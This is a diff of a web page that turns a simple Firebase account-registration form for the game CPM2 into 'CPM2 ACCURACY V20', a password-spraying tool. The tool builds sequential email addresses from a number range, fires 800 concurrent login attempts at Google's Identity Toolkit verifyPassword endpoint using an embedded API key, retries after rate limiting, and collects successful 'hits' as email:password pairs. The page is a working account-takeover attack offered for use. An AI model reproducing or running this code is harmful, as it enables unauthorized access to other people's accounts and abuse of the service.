@@ -3,86 +3,133 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CPM2 - Official Register</title>
+    <title>CPM2 ACCURACY V20</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #0b0b0b; color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #161616; padding: 30px; border-radius: 15px; border: 1px solid #333; width: 350px; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.7); }
-        .card h1 { color: #ff9f43; font-size: 24px; margin-bottom: 10px; text-transform: uppercase; }
-        .card p { color: #888; font-size: 13px; margin-bottom: 25px; }
-        input { width: 100%; padding: 12px; margin-bottom: 15px; background: #222; border: 1px solid #444; border-radius: 8px; color: #fff; box-sizing: border-box; outline: none; }
-        input:focus { border-color: #ff9f43; }
-        button { width: 100%; padding: 12px; background: #ff9f43; border: none; color: #000; font-weight: bold; border-radius: 8px; cursor: pointer; font-size: 16px; transition: 0.3s; }
-        button:hover { background: #e67e22; transform: translateY(-2px); }
-        #msg { margin-top: 20px; font-size: 14px; font-weight: 500; }
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #ff9f43; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: none; margin: 10px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; padding: 10px; text-align: center; }
+        .terminal { max-width: 550px; margin: auto; border: 2px solid #0f0; background: #050505; padding: 15px; border-radius: 12px; box-shadow: 0 0 35px #0f0; }
+        h1 { font-size: 18px; color: #fff; border-bottom: 2px solid #0f0; padding-bottom: 10px; margin-bottom: 15px; }
+        
+        .input-group { display: flex; flex-direction: column; gap: 8px; margin-bottom: 15px; }
+        .range-row { display: flex; gap: 10px; }
+        input { flex: 1; padding: 14px; background: #111; border: 1px solid #0f0; color: #fff; border-radius: 5px; outline: none; text-align: center; font-size: 14px; }
+        
+        .btn-start { width: 100%; padding: 18px; background: #0f0; color: #000; border: none; font-weight: bold; font-size: 18px; cursor: pointer; border-radius: 8px; margin-bottom: 10px; }
+        .btn-copy { width: 100%; padding: 12px; background: #222; color: #0f0; border: 1px solid #0f0; cursor: pointer; border-radius: 5px; font-weight: bold; margin-bottom: 10px; }
+
+        .stats { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; }
+        .stat-card { background: #0a0a0a; border: 1px solid #333; padding: 12px; border-radius: 8px; }
+        .stat-card b { font-size: 24px; color: #0f0; display: block; }
+        
+        #status { color: #0ff; font-weight: bold; margin-bottom: 10px; font-size: 13px; min-height: 15px; }
+        #results { width: 100%; height: 320px; background: #000; color: #fff; border: 1px solid #333; padding: 10px; font-size: 12px; margin-top: 10px; resize: none; border-radius: 8px; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <h1>CPM2 Admin</h1>
-    <p>Create a New Multiplayer Account</p>
+<div class="terminal">
+    <h1>🚀 CPM2 ACCURACY V20</h1>
+    <div id="status">READY TO SCAN</div>
+
+    <div class="input-group">
+        <div class="range-row">
+            <input type="number" id="minNum" placeholder="MIN (Start)">
+            <input type="number" id="maxNum" placeholder="MAX (End)">
+        </div>
+        <input type="text" id="fmt" placeholder="FORMAT: USER_{6}_@GMAIL.COM">
+        <input type="text" id="pass" placeholder="PASSWORD">
+    </div>
     
-    <input type="email" id="email" placeholder="Email Address">
-    <input type="password" id="password" placeholder="Password (Min 6 chars)">
-    
-    <button id="btn" onclick="register()">CREATE ACCOUNT</button>
-    <div id="loader" class="loader"></div>
-    <div id="msg"></div>
+    <button class="btn-start" id="mainBtn" onclick="ignite()">⚡ START SCAN</button>
+    <button class="btn-copy" onclick="copyAll()">📋 COPY ALL HITS</button>
+
+    <div class="stats">
+        <div class="stat-card">CHECKED<b id="cVal">0</b></div>
+        <div class="stat-card">HITS<b id="fVal">0</b></div>
+    </div>
+
+    <textarea id="results" readonly placeholder="Hits Order: 1, 2, 3... (No Skips)"></textarea>
 </div>
 
 <script>
-    async function register() {
-        const email = document.getElementById('email').value;
-        const password = document.getElementById('password').value;
-        const msg = document.getElementById('msg');
-        const loader = document.getElementById('loader');
-        const btn = document.getElementById('btn');
+    let active = false, checked = 0, found = 0, current, limit, nextSync = 0;
+    let storage = new Map(), uiBuffer = "", startTime;
+    const apiKey = "AIzaSyCQDz9rgjgmvmFkvVfmvr2-7fT4tfrzRRQ";
 
-        // Ninte puthiya Firebase Config
-        const API_KEY = "AIzaSyCqLQh3vlumESlbAsZSZRQChp7eW43kzhk";
-        const url = `https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=${API_KEY}`;
+    async function ignite() {
+        if (active) { location.reload(); return; }
+        let s = parseInt(document.getElementById('minNum').value);
+        let e = parseInt(document.getElementById('maxNum').value);
+        let f = document.getElementById('fmt').value.toUpperCase().trim();
+        let p = document.getElementById('pass').value.trim();
 
-        if (!email || !password) {
-            msg.style.color = "#ff4757";
-            msg.innerText = "Please fill all fields!";
-            return;
+        if (isNaN(s) || isNaN(e) || !f.includes('{')) return alert("Inputs ശരിയല്ല!");
+
+        active = true; current = s; nextSync = s; limit = e; startTime = Date.now();
+        document.getElementById('mainBtn').innerText = "🛑 STOP ENGINE";
+        document.getElementById('mainBtn').style.background = "#f00";
+        
+        let digits = f.match(/\{(\d+)\}/)[1];
+
+        // Optimized Thread Count for Stability
+        for (let i = 0; i < 800; i++) {
+            (async function worker() {
+                while (active && current <= limit) {
+                    let n = current++;
+                    await check(f, p, n, digits);
+                }
+            })();
         }
 
-        btn.style.display = "none";
-        loader.style.display = "block";
-        msg.innerText = "";
-
-        try {
-            const response = await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    email: email,
-                    password: password,
-                    returnSecureToken: true
-                })
-            });
-
-            const data = await response.json();
-
-            if (response.ok) {
-                msg.style.color = "#2ed573";
-                msg.innerHTML = "✅ SUCCESS!<br>Account created. Log in to CPM2.";
-            } else {
-                msg.style.color = "#ff4757";
-                msg.innerText = "Error: " + data.error.message;
+        setInterval(() => {
+            if (!active) return;
+            let spd = Math.round(checked / ((Date.now() - startTime) / 1000));
+            document.getElementById('status').innerText = `🔥 SPEED: ${spd} REQ/S | SYNCING: ${nextSync}`;
+            document.getElementById('cVal').innerText = checked;
+            document.getElementById('fVal').innerText = found;
+            if (uiBuffer !== "") {
+                let box = document.getElementById('results');
+                box.value += uiBuffer;
+                box.scrollTop = box.scrollHeight;
+                uiBuffer = "";
             }
-        } catch (error) {
-            msg.style.color = "#ff4757";
-            msg.innerText = "Network Error! Check connection.";
-        } finally {
-            btn.style.display = "block";
-            loader.style.display = "none";
-        }
+        }, 500);
+    }
+
+    async function check(f, p, n, d) {
+        let email = f.replace(/\{(\d+)\}/, n.toString().padStart(d, '0'));
+        try {
+            let r = await fetch(`https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=${apiKey}`, {
+                method: 'POST',
+                body: JSON.stringify({ email, password: p, returnSecureToken: true }),
+                headers: { 'Content-Type': 'application/json' }
+            });
+            
+            if (r.status === 429) {
+                document.getElementById('status').innerText = "⚠️ COOLING DOWN IP...";
+                await new Promise(res => setTimeout(res, 6000));
+                return check(f, p, n, d);
+            }
+
+            let resJson = await r.json();
+            storage.set(n, { hit: (resJson && resJson.idToken), mail: email });
+
+            // STRICT SEQUENCE LOCK: 1-2-3-4-5...
+            while (storage.has(nextSync)) {
+                let item = storage.get(nextSync);
+                if (item.hit) { found++; uiBuffer += item.mail + ":" + p + "\n"; }
+                checked++;
+                storage.delete(nextSync);
+                nextSync++;
+            }
+        } catch (e) { return check(f, p, n, d); }
+    }
+
+    function copyAll() {
+        let area = document.getElementById('results');
+        area.select();
+        document.execCommand('copy');
+        alert("Copied! 🔥");
     }
 </script>
-
 </body>
 </html>
